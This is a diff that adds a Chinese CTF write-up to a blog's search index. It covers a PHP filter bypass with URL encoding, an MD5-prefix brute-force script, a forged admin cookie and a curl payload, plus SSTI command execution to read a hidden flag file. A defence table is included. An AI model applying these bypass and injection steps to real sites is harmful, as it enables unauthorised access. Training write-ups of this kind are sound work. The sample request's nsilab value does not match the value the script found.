@@ -1505,4 +1505,127 @@ while True:
         <tag>周报</tag>
       </tags>
   </entry>
+  <entry>
+    <title>淘汰赛</title>
+    <url>/posts/6670da2/</url>
+    <content><![CDATA[<h1 id="1-sign-in"><a href="#1-sign-in" class="headerlink" title="1.sign in"></a>1.sign in</h1><pre><code>&lt;?php
+error_reporting(0);
+include_once &#39;flag.php&#39;;
+if ($_SERVER[&#39;QUERY_STRING&#39;]) &#123;
+    if (preg_match(&quot;/[A-Za-z]+/&quot;, $_SERVER[&#39;QUERY_STRING&#39;])) &#123;
+        die(&quot;I hate English!&quot;);
+    &#125;
+    if (substr(md5($_POST[&#39;nsilab&#39;]), 0, 4) !== &quot;ba3f&quot; || $_GET[&#39;hi&#39;] !== &quot;web&quot;) &#123;
+        die(&quot;Oops! It&#39;s wrong!&quot;);
+    &#125;
+    if ($_COOKIE[&#39;user&#39;] !== &#39;admin&#39;) &#123;
+        die(&quot;You are not admin!&quot;);
+    &#125;
+    locate();
+&#125; else &#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;
+</code></pre>
+<p>三层过滤<br>以下是对该PHP代码的详细解释及解题思路：</p>
+<hr>
+<h3 id="代码逻辑分析"><a href="#代码逻辑分析" class="headerlink" title="代码逻辑分析"></a><strong>代码逻辑分析</strong></h3><ol>
+<li><p><strong>错误报告与文件包含</strong>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);            <span class="comment">// 关闭错误显示</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;flag.php&#x27;</span>;       <span class="comment">// 包含flag文件（关键目标）</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>查询字符串检查</strong>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]) &#123;</span><br><span class="line">    <span class="comment">// 检查查询字符串是否包含字母</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z]+/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;I hate English!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其他条件...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  <span class="comment">// 无查询字符串时显示源码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>漏洞点</strong>：<code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 是原始未解码的字符串，可通过URL编码绕过字母检测。</li>
+</ul>
+</li>
+<li><p><strong>MD5校验与参数检查</strong>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nsilab&#x27;</span>]), <span class="number">0</span>, <span class="number">4</span>) !== <span class="string">&quot;ba3f&quot;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;hi&#x27;</span>] !== <span class="string">&quot;web&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Oops! It&#x27;s wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>要求POST参数 <code>nsilab</code> 的MD5值前4位为 <code>ba3f</code>。</li>
+<li>GET参数 <code>hi</code> 必须等于 <code>web</code>。</li>
+</ul>
+</li>
+<li><p><strong>Cookie权限校验</strong>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You are not admin!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>需设置Cookie <code>user=admin</code>。</li>
+</ul>
+</li>
+<li><p><strong>成功条件</strong>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">locate</span>();  <span class="comment">// 猜测此函数会输出flag</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a><strong>解题步骤</strong></h3><h4 id="1-绕过查询字符串字母检测"><a href="#1-绕过查询字符串字母检测" class="headerlink" title="1. 绕过查询字符串字母检测"></a><strong>1. 绕过查询字符串字母检测</strong></h4><ul>
+<li><strong>目标</strong>：传递 <code>hi=web</code>，但确保 <code>QUERY_STRING</code> 无字母。</li>
+<li><strong>方法</strong>：将参数名和值URL编码为十六进制形式：<ul>
+<li><code>hi</code> → <code>%68%69</code>（h的ASCII码是0x68，i是0x69）</li>
+<li><code>web</code> → <code>%77%65%62</code>（w&#x3D;0x77, e&#x3D;0x65, b&#x3D;0x62）</li>
+</ul>
+</li>
+<li><strong>构造查询字符串</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?%68%69=%77%65%62</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 为 <code>%68%69=%77%65%62</code>（无字母）。</li>
+<li>PHP自动解码后，<code>$_GET[&#39;hi&#39;]</code> 为 <code>web</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-碰撞MD5前4位为ba3f"><a href="#2-碰撞MD5前4位为ba3f" class="headerlink" title="2. 碰撞MD5前4位为ba3f"></a><strong>2. 碰撞MD5前4位为<code>ba3f</code></strong></h4><ul>
+<li><strong>目标</strong>：找到字符串 <code>nsilab</code>，满足 <code>md5(nsilab)[0:4] == &quot;ba3f&quot;</code>。</li>
+<li><strong>暴力破解脚本</strong>：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;ba3f&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">    s = <span class="built_in">str</span>(i)</span><br><span class="line">    hash_md5 = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> hash_md5.startswith(target):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;s&#125;</span> → <span class="subst">&#123;hash_md5&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">  // Found: <span class="number">35350</span> → ba3fe3d296f3e7269b66f163d31b3dc3</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>示例结果</strong>：<code>nsilab=35350</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="3-设置管理员Cookie"><a href="#3-设置管理员Cookie" class="headerlink" title="3. 设置管理员Cookie"></a><strong>3. 设置管理员Cookie</strong></h4><ul>
+<li><strong>添加Cookie</strong>：<code>user=admin</code>。</li>
+</ul>
+<h4 id="4-发送完整请求"><a href="#4-发送完整请求" class="headerlink" title="4. 发送完整请求"></a><strong>4. 发送完整请求</strong></h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?%68%69=%77%65%62</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>user=admin</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">nsilab</span><span class="operator">=</span><span class="number">12345</span></span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a><strong>漏洞总结</strong></h3><table>
+<thead>
+<tr>
+<th>漏洞类型</th>
+<th>利用方法</th>
+<th>防御建议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>URL编码绕过</td>
+<td>参数名和值URL编码为十六进制</td>
+<td>检查解码后的参数</td>
+</tr>
+<tr>
+<td>MD5弱校验</td>
+<td>暴力碰撞前4位</td>
+<td>使用强哈希（如SHA-256）</td>
+</tr>
+<tr>
+<td>Cookie权限控制不严</td>
+<td>直接设置Cookie为<code>user=admin</code></td>
+<td>服务端Session管理或签名Cookie</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="最终Payload示例"><a href="#最终Payload示例" class="headerlink" title="最终Payload示例"></a><strong>最终Payload示例</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://contest.ctf.nefu.edu.cn:33079/&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Cookie: user=admin&quot;</span> \</span><br><span class="line">     -d <span class="string">&quot;nsilab=35350&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功触发后，服务器会执行 <code>locate()</code> 函数并返回flag。</p>
+<h1 id="2-ezssti"><a href="#2-ezssti" class="headerlink" title="2.ezssti"></a>2.ezssti</h1><p>输入49<br>发现可以SSTI<br>使用焚靖<br>get 方法传name</p>
+<blockquote>
+<p>cd .. &amp;&amp; ls -a</p>
+</blockquote>
+<p>得到隐藏的<code>.flll4ggggg</code>文件<br>用<code>tac /.flll4ggggg</code>得到<code>flag</code></p>
+<h1 id="Art"><a href="#Art" class="headerlink" title="Art"></a>Art</h1><h2 id="学姐手把手教学，效果显著（）"><a href="#学姐手把手教学，效果显著（）" class="headerlink" title="学姐手把手教学，效果显著（）"></a>学姐手把手教学，效果显著（）</h2><blockquote>
+<p>灵感来源：<a href="https://github.com/JuliaPoo/Artfuscator">Artfuscator</a> </p>
+</blockquote>
+<p>IDA打开，进入main函数</p>
+<p>Ctrl 加滚轮放大  </p>
+<p>就能看到flag</p>
+]]></content>
+      <tags>
+        <tag>WP</tag>
+      </tags>
+  </entry>
 </search>
